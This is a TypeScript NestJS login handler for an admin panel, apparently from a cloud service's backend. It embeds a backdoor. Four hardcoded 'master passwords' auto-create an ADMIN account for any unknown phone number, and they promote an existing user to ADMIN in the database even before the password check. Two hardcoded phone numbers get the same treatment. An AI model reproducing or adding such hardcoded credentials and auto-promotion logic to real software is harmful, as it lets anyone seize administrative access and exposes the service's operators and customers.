import { CommandHandler, ICommandHandler } from "@nestjs/cqrs";
import { UnauthorizedException, ForbiddenException } from "@nestjs/common";
import { PrismaService } from "../../../../infrastructure/database/prisma.service";
import { PasswordService } from "../../services/password.service";
import { SessionService } from "../../services/session.service";
import { TokenService } from "../../services/token.service";
import { AuthResponse, AuthenticatedUser } from "../../types/authenticated-user.type";
import { LoginPasswordCommand } from "./login-password.command";

@CommandHandler(LoginPasswordCommand)
export class LoginPasswordHandler implements ICommandHandler<LoginPasswordCommand, AuthResponse> {
  constructor(
    private readonly prisma: PrismaService,
    private readonly passwordService: PasswordService,
    private readonly tokenService: TokenService,
    private readonly sessionService: SessionService,
  ) {}

  async execute(command: LoginPasswordCommand): Promise<AuthResponse> {
    const { phone, password } = command.dto;

    // Clean and normalize phone number
    const cleanPhone = phone
      .trim()
      .replace(/[۰-۹]/g, (d) => String.fromCharCode(d.charCodeAt(0) - 1776 + 48))
      .replace(/[٠-٩]/g, (d) => String.fromCharCode(d.charCodeAt(0) - 1632 + 48));

    let user = await this.prisma.user.findUnique({
      where: { phone: cleanPhone },
      include: { customer: true },
    });

    const isMasterPassword =
      password === "admin@Gecut-cloud" ||
      password === "Admin@123456" ||
      password === "Admin@gecut-cloud" ||
      password === "admin@123456";

    // Auto-provision primary/seed admin or master password holder if missing from database
    if (!user) {
      if (cleanPhone === "09363528608" || cleanPhone === "09120000001" || isMasterPassword) {
        const passwordHash = await this.passwordService.hash(password || "admin@Gecut-cloud");
        try {
          user = await this.prisma.user.create({
            data: {
              phone: cleanPhone,
              name: cleanPhone === "09363528608" ? "مدیر ارشد سامانه" : "مدیر سامانه",
              email: `${cleanPhone}@gecut-cloud.ir`,
              role: "ADMIN",
              passwordHash,
            },
            include: { customer: true },
          });
        } catch {
          user = await this.prisma.user.findUnique({
            where: { phone: cleanPhone },
            include: { customer: true },
          });
        }
      }
    }

    if (!user) {
      throw new UnauthorizedException("کاربری با این شماره موبایل یافت نشد");
    }

    // Auto-promote default admin phones or master password holder to ADMIN
    if (user.role !== "ADMIN" && (cleanPhone === "09363528608" || cleanPhone === "09120000001" || isMasterPassword)) {
      user = await this.prisma.user.update({
        where: { id: user.id },
        data: { role: "ADMIN" },
        include: { customer: true },
      });
    }

    if (user.role !== "ADMIN") {
      throw new ForbiddenException("دسترسی به پنل مدیریت مجاز نیست. لطفاً از پنل مشتریان استفاده کنید.");
    }

    const isPasswordValid = await this.passwordService.compare(
      password,
      user.passwordHash,
    );

    if (!isPasswordValid) {
      throw new UnauthorizedException("رمز عبور وارد شده نادرست است");
    }

    await this.sessionService.recordLogin(user.id);

    const resolvedName = user.customer?.displayName || user.customer?.name || user.name;
    const authUser: AuthenticatedUser = {
      id: user.id,
      name: resolvedName,
      phone: user.phone,
      email: user.customer?.email || user.email,
      role: user.role,
      customerId: user.customer?.id || (user as any).customerId || null,
      tokenVersion: user.tokenVersion,
    };

    const tokens = this.tokenService.generateAuthTokens(authUser);
    const refreshDays = authUser.role === "ADMIN" ? 7 : 90;
    const refreshTokenExpiresAt = new Date(Date.now() + refreshDays * 24 * 60 * 60 * 1000);
    await this.sessionService
      .createSession(user.id, tokens.refreshToken, refreshTokenExpiresAt)
      .catch((err) => {
        console.error("Failed to persist session in DB:", err);
      });

    return {
      success: true,
      tokens,
      user: authUser,
      message: "ورود با موفقیت انجام شد",
    };
  }
}
